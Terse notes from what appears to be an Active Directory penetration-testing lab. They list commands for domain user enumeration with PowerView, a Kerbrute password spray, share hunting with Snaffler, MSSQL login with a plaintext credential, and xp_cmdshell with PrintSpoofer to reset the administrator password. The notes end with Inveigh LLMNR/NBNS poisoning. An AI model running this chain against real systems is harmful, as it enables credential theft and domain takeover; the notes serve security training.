Set-ExecutionPolicy Bypass -Scope Process  
Import-Module .\PowerView.ps1  
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt  
Get-Content .\adusers.txt | select -First 10  
 
 .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1  
 //domain name case sensitive !!  

.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data  
 mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60  

 xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"  

 Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

 
